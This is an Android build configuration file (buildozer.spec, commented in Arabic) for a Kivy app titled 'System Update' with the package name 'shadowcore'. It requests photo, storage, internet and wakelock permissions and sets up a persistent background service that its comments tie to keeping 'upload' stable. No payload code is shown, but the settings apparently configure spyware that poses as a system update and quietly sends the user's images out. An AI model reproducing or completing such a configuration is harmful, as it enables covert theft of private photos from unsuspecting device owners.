[app]

# (str) اسم التطبيق الذي سيظهر على الشاشة
title = System Update

# (str) اسم الحزمة (فريد)
package.name = shadowcore

# (str) نطاق الحزمة
package.domain = org.test

# (str) مكان وجود ملف main.py
source.dir = .

# (list) الملفات المطلوب تضمينها
source.include_exts = py,png,jpg,kv,atlas

# (str) إصدار التطبيق
version = 1.2

# (list) المكتبات المطلوبة (تم إضافة certifi و urllib3 لضمان استقرار الاتصال)
requirements = python3,kivy==2.2.1,pyjnius,requests,certifi,urllib3

# (str) وضع الشاشة (طولي دائماً لإصلاح مشكلة العرض)
orientation = portrait

# (list) الصلاحيات (تم إضافة صلاحيات الصور الحديثة والخدمة الخلفية)
android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC

# (int) استهداف أحدث API لأندرويد
android.api = 33

# (int) الحد الأدنى لدعم الأجهزة (أندرويد 5.0)
android.minapi = 21

# (str) المعماريات المدعومة (لضمان العمل على أغلب الموبايلات)
android.archs = arm64-v8a, armeabi-v7a

# (bool) تفعيل دعم أندرويد إكس
android.enable_androidx = True

# (list) تعريف الخدمة الخلفية (اسم الخدمة:ملف الخدمة)
services = Service:service.py

# (bool) تشغيل الخدمة في واجهة النظام (مهم لاستقرار الرفع)
android.foreground_service = True

# (str) أيقونة التطبيق (اختياري، يترك افتراضي حالياً)
#icon.filename = %(source.dir)s/icon.png

# (bool) منع الشاشة من الانطفاء أثناء العمل
android.wakelock = True

# (bool) نسخ المكتبات بدلاً من عمل ملف .so واحد لزيادة التوافق
android.copy_libs = 1

[buildozer]

# (int) مستوى السجل (2 يعني عرض كل التفاصيل والأخطاء أثناء البناء)
log_level = 2

# (int) عرض تحذير إذا تم التشغيل كـ root
warn_on_root = 1
